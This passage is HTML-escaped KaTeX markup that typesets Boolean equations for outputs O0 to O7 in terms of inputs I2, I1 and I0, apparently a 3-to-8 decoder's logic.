class="mord">&lt;/span>&lt;/span>&lt;span style="top:-0.7067em;">&lt;span class="pstrut" style="height:2.8833em;">&lt;/span>&lt;span class="mord">&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:2.8367em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="col-align-l">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:3.3367em;">&lt;span style="top:-5.4533em;">&lt;span class="pstrut" style="height:3em;">&lt;/span>&lt;span class="mord">&lt;span class="mord">&lt;/span>&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.02778em;">O&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">0&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="mspace" style="margin-right:0.2778em;">&lt;/span>&lt;span class="mrel">=&lt;/span>&lt;span class="mspace" style="margin-right:0.2778em;">&lt;/span>&lt;span class="mord overline">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.8833em;">&lt;span style="top:-3em;">&lt;span class="pstrut" style="height:3em;">&lt;/span>&lt;span class="mord">&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.07847em;">I&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">2&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.07847em;">I&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">1&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.07847em;">I&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">0&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span style="top:-3.8033em;">&lt;span class="pstrut" style="height:3em;">&lt;/span>&lt;span class="overline-line" style="border-bottom-width:0.04em;">&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="mpunct">,&lt;/span>&lt;span class="mspace" style="margin-right:2em;">&lt;/span>&lt;span class="mspace" style="margin-right:0.1667em;">&lt;/span>&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.02778em;">O&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">4&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="mspace" style="margin-right:0.2778em;">&lt;/span>&lt;span class="mrel">=&lt;/span>&lt;span class="mspace" style="margin-right:0.2778em;">&lt;/span>&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.07847em;">I&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">2&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="mord overline">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.8833em;">&lt;span style="top:-3em;">&lt;span class="pstrut" style="height:3em;">&lt;/span>&lt;span class="mord">&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.07847em;">I&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">1&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.07847em;">I&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">0&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span style="top:-3.8033em;">&lt;span class="pstrut" style="height:3em;">&lt;/span>&lt;span class="overline-line" style="border-bottom-width:0.04em;">&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span style="top:-3.91em;">&lt;span class="pstrut" style="height:3em;">&lt;/span>&lt;span class="mord">&lt;span class="mord">&lt;/span>&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.02778em;">O&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">1&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="mspace" style="margin-right:0.2778em;">&lt;/span>&lt;span class="mrel">=&lt;/span>&lt;span class="mspace" style="margin-right:0.2778em;">&lt;/span>&lt;span class="mord overline">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.8833em;">&lt;span style="top:-3em;">&lt;span class="pstrut" style="height:3em;">&lt;/span>&lt;span class="mord">&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.07847em;">I&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">2&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.07847em;">I&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">1&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span style="top:-3.8033em;">&lt;span class="pstrut" style="height:3em;">&lt;/span>&lt;span class="overline-line" style="border-bottom-width:0.04em;">&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.07847em;">I&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">0&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="mpunct">,&lt;/span>&lt;span class="mspace" style="margin-right:2em;">&lt;/span>&lt;span class="mspace" style="margin-right:0.1667em;">&lt;/span>&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.02778em;">O&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">5&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="mspace" style="margin-right:0.2778em;">&lt;/span>&lt;span class="mrel">=&lt;/span>&lt;span class="mspace" style="margin-right:0.2778em;">&lt;/span>&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.07847em;">I&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">2&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="mord overline">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.8833em;">&lt;span style="top:-3em;">&lt;span class="pstrut" style="height:3em;">&lt;/span>&lt;span class="mord">&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.07847em;">I&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">1&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span style="top:-3.8033em;">&lt;span class="pstrut" style="height:3em;">&lt;/span>&lt;span class="overline-line" style="border-bottom-width:0.04em;">&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.07847em;">I&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">0&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span style="top:-2.3667em;">&lt;span class="pstrut" style="height:3em;">&lt;/span>&lt;span class="mord">&lt;span class="mord">&lt;/span>&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.02778em;">O&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">2&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="mspace" style="margin-right:0.2778em;">&lt;/span>&lt;span class="mrel">=&lt;/span>&lt;span class="mspace" style="margin-right:0.2778em;">&lt;/span>&lt;span class="mord overline">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.8833em;">&lt;span style="top:-3em;">&lt;span class="pstrut" style="height:3em;">&lt;/span>&lt;span class="mord">&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.07847em;">I&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">2&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span style="top:-3.8033em;">&lt;span class="pstrut" style="height:3em;">&lt;/span>&lt;span class="overline-line" style="border-bottom-width:0.04em;">&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.07847em;">I&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">1&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="mord overline">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.8833em;">&lt;span style="top:-3em;">&lt;span class="pstrut" style="height:3em;">&lt;/span>&lt;span class="mord">&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.07847em;">I&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">0&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span style="top:-3.8033em;">&lt;span class="pstrut" style="height:3em;">&lt;/span>&lt;span class="overline-line" style="border-bottom-width:0.04em;">&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="mpunct">,&lt;/span>&lt;span class="mspace" style="margin-right:2em;">&lt;/span>&lt;span class="mspace" style="margin-right:0.1667em;">&lt;/span>&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.02778em;">O&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">6&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="mspace" style="margin-right:0.2778em;">&lt;/span>&lt;span class="mrel">=&lt;/span>&lt;span class="mspace" style="margin-right:0.2778em;">&lt;/span>&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.07847em;">I&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">2&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.07847em;">I&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">1&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="mord overline">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.8833em;">&lt;span style="top:-3em;">&lt;span class="pstrut" style="height:3em;">&lt;/span>&lt;span class="mord">&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.07847em;">I&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">0&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span style="top:-3.8033em;">&lt;span class="pstrut" style="height:3em;">&lt;/span>&lt;span class="overline-line" style="border-bottom-width:0.04em;">&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span style="top:-0.8233em;">&lt;span class="pstrut" style="height:3em;">&lt;/span>&lt;span class="mord">&lt;span class="mord">&lt;/span>&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.02778em;">O&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">3&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="mspace" style="margin-right:0.2778em;">&lt;/span>&lt;span class="mrel">=&lt;/span>&lt;span class="mspace" style="margin-right:0.2778em;">&lt;/span>&lt;span class="mord overline">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.8833em;">&lt;span style="top:-3em;">&lt;span class="pstrut" style="height:3em;">&lt;/span>&lt;span class="mord">&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.07847em;">I&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">2&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span style="top:-3.8033em;">&lt;span class="pstrut" style="height:3em;">&lt;/span>&lt;span class="overline-line" style="border-bottom-width:0.04em;">&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.07847em;">I&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">1&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.07847em;">I&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">0&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="mpunct">,&lt;/span>&lt;span class="mspace" style="margin-right:2em;">&lt;/span>&lt;span class="mspace" style="margin-right:0.1667em;">&lt;/span>&lt;span class="mord">&lt;span class="mord mathnormal" style="margin-right:0.02778em;">O&lt;/span>&lt;span class="msupsub">&lt;span class="vlist-t vlist-t2">&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.3011em;">&lt;span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;">&lt;span class="pstrut" style="height:2.7em;">&lt;/span>&lt;span class="sizing reset-size6 size3 mtight">&lt;span class="mord mtight">7&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="vlist-s">&amp;ZeroWidthSpace;&lt;/span>&lt;/span>&lt;span class="vlist-r">&lt;span class="vlist" style="height:0.15em;">&lt;span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;/span>&lt;span class="mspace" style="margin-right:0.2778em;">&lt;/span>&lt;span class="mrel">=&lt;/span>&lt;span 